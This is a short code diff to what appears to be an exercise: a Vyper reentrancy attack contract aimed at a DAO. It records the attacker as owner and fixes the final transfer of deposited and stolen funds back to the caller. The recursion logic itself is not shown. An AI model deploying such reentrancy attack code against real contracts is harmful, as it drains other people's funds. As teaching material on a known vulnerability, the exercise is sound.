@@ -25,6 +25,7 @@ def _attack() -> bool:
 @payable
 def attack(dao_address:address):
     self.dao_address = dao_address
+    self.owner_address = msg.sender
     deposit_amount: uint256 = msg.value    
  
     # Attack cannot withdraw more than what exists in the DAO
@@ -40,7 +41,7 @@ def attack(dao_address:address):
         continueAttack = self._attack()
        
     # TODO: After the recursion has finished, all the stolen funds are held by this contract. Now, you need to send all funds (deposited and stolen) to the entity that called this contract
-    send(self.owner_address, msg.value)
+    send(self.owner_address, deposit_amount)
 
 
 @external
